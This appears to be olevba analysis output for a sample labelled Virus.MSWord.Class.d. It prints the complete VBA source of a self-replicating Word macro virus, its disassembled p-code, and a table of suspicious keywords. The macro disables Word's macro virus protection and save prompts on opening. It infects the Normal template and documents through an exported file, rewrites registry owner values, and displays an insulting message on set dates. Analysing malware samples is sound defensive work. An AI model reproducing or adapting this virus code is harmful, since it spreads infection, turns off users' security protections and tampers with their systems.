olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Const REG_SZ As Long = 1
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Const HKEY_CURRENT_USER As Long = &H80000001
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Sub AutoOpen()
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
On Error GoTo out
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Options.VirusProtection = False
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Options.SaveNormalPrompt = False
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Options.ConfirmConversions = False
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If nt > 70 And ad > 0 Then GoTo out
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If nt < 70 Then
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End If
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
host.codemodule.AddFromFile ("c:\class.sys")
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
With host.codemodule
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    For x = 1 To 16
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    .deletelines 1
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    Next x
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End With
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If nt < 70 Then
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    With host.codemodule
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    .replaceline 1, "Sub AutoClose()"
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    .replaceline 91, "Sub ToolsMacro()"
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    For x = 70 To 81
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
        .deletelines 62
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    Next x
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    .replaceline 35, "    For x = 1 To 4"
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    End With
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End If
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If nt < 70 Then
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
u = RegCloseKey(k)
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End If
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
With host.codemodule
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    For x = 2 To 104 Step 2
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    Next x
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End With
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
out:
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End Sub
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Sub ViewVBCode()
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End Sub

Private Sub CheckBox1_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9109 bytes
' Line #0:
' 	FuncDefn (Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #1:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #2:
' 	FuncDefn (Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long)
' Line #3:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #4:
' 	FuncDefn (Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long)
' Line #5:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #6:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn REG_SZ (As Long)
' Line #7:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #8:
' 	Dim (Const) 
' 	LitHI4 0x0001 0x8000 
' 	VarDefn HKEY_CURRENT_USER (As Long)
' Line #9:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #10:
' 	Dim (Const) 
' 	LitHI4 0x0002 0x8000 
' 	VarDefn HKEY_LOCAL_MACHINE (As Long)
' Line #11:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #12:
' 	FuncDefn (Sub AutoOpen())
' Line #13:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #14:
' 	OnError out 
' Line #15:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #19:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #21:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #22:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #23:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #24:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #25:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #26:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #28:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #29:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #30:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #31:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #32:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #33:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #34:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #38:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #39:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #40:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #41:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #42:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #43:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #44:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #45:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #46:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	For 
' Line #47:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #48:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #49:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #50:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #52:
' 	EndWith 
' Line #53:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #54:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #55:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #56:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #57:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #58:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #59:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #60:
' 	LitDI2 0x005B 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #61:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #62:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0046 
' 	LitDI2 0x0051 
' 	For 
' Line #63:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #64:
' 	LitDI2 0x003E 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #65:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #66:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #68:
' 	LitDI2 0x0023 
' 	LitStr 0x0012 "    For x = 1 To 4"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #69:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #70:
' 	EndWith 
' Line #71:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #74:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #75:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #76:
' 	Ld HKEY_LOCAL_MACHINE 
' 	LitStr 0x0029 "Software\Microsoft\Windows\CurrentVersion"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld k 
' 	ArgsLd RegOpenKeyExA 0x0005 
' 	St u 
' Line #77:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #78:
' 	Ld k 
' 	LitStr 0x000F "RegisteredOwner"
' 	LitDI2 0x0000 
' 	Ld REG_SZ 
' 	LitStr 0x0012 "VicodinES /CB /TNN"
' 	LitDI2 0x0001 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St u 
' Line #79:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #80:
' 	Ld k 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	LitDI2 0x0000 
' 	Ld REG_SZ 
' 	LitStr 0x0019 "-(Dr. Diet Mountain Dew)-"
' 	LitDI2 0x0001 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St u 
' Line #81:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #82:
' 	Ld k 
' 	ArgsLd RegCloseKey 0x0001 
' 	St u 
' Line #83:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #86:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #87:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #88:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0068 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #89:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #90:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #91:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #92:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #93:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #94:
' 	EndWith 
' Line #95:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #96:
' 	Label out 
' Line #97:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #98:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #99:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #100:
' 	EndSub 
' Line #101:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #102:
' 	FuncDefn (Sub ViewVBCode())
' Line #103:
' 	QuoteRem 0x0000 0x002D "Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC"
' Line #104:
' 	EndSub 
' Line #105:
' Line #106:
' 	FuncDefn (Private Sub CheckBox1_Click())
' Line #107:
' Line #108:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CheckBox1_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

